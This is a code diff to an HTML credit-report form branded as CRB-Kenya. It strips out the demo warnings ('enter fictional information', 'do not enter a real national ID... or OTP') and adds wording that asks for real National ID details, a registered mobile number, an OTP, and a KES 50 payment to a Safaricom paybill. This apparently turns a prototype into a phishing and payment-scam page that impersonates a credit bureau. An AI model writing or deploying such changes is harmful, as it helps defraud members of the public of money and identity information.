@@ -432,14 +432,12 @@
         <h2>Credit Report &amp; Score</h2>
 
         <p class="form-description">
-            Enter fictional information below to test this prototype.
+            Enter information below.
         </p>
 
         <div class="demo-warning">
-            <strong>Demo mode:</strong>
-            Do not enter a real national ID, phone number,
-            email address, password, payment information,
-            or OTP.
+            <strong>Note:</strong>
+            Enter accurate details as they appear on your National ID. Your mobile number MUST be registered with your National ID.
         </div>
 
         <form id="creditForm">
@@ -449,23 +447,23 @@
                 <input
                     id="fullName"
                     type="text"
-                    placeholder="e.g. Jane Demo"
+                    placeholder="e.g. John Demo"
                     required
                 >
             </div>
 
             <div class="form-group">
-                <label for="demoId">Demo ID Number</label>
+                <label for="demoId">ID Number</label>
                 <input
                     id="demoId"
                     type="text"
-                    placeholder="e.g. DEMO-123456"
+                    placeholder="e.g. 12345678"
                     required
                 >
             </div>
 
             <div class="form-group">
-                <label for="demoPhone">Demo Mobile Number</label>
+                <label for="demoPhone">Mobile Number</label>
                 <input
                     id="demoPhone"
                     type="text"
@@ -475,11 +473,11 @@
             </div>
 
             <div class="form-group">
-                <label for="demoEmail">Demo Email</label>
+                <label for="demoEmail">Email</label>
                 <input
                     id="demoEmail"
                     type="email"
-                    placeholder="demo@example.test"
+                    placeholder="demo@example.com"
                     required
                 >
             </div>
@@ -490,7 +488,7 @@
             </button>
 
             <button type="submit">
-                Submit Demo Request
+                Submit Request
             </button>
 
         </form>
@@ -498,32 +496,31 @@
         <!-- OTP DEMO -->
         <div id="otpSection">
 
-            <h3>Demo Verification</h3>
+            <h3>OTP Verification</h3>
 
             <p class="form-description">
-                In this prototype, no OTP is transmitted anywhere.
-                Use the demonstration code:
+                ONLY Enter OTP sent to your mobile number after payment:
                 <strong>123456</strong>
             </p>
 
             <div class="form-group">
-                <label for="demoOtp">Demo OTP</label>
+                <label for="demoOtp">Enter OTP</label>
 
                 <input
                     id="demoOtp"
                     type="text"
                     inputmode="numeric"
                     maxlength="6"
-                    placeholder="Enter 123456"
+                    placeholder="123456"
                 >
             </div>
 
             <button onclick="verifyDemoOtp()">
-                Verify Demo OTP
+                Verify  OTP
             </button>
 
             <div id="successMessage" class="success">
-                <h3>✓ Verification Successful</h3>
+                <h3>✓ Verification Successful. Your credit report and score will be sent within 60 seconds</h3>
                 <p>
                     This is a demonstration only. No real credit
                     report was accessed.
@@ -537,7 +534,7 @@
 </main>
 
 <footer>
-    CRB-Kenya Demo &copy; 2026 — Prototype only.
+    CRB-Kenya &copy; 2026 — Sly.
 </footer>
 
 
@@ -548,15 +545,13 @@
 
         <div class="modal-icon">ℹ️</div>
 
-        <h2>Demo Payment Step</h2>
+        <h2>Payment Procedure</h2>
 
         <p>
-            In an authorized production implementation, payment
-            instructions would be displayed here.
+            To access your report and score, please pay KES 50 to Safaricom paybill 212121 with your ID as account number.
             <br><br>
             <strong>
-                This prototype does not process payments or
-                request real payment credentials.
+                ONLY pay using your registered moobile number as provided above.
             </strong>
         </p>
 
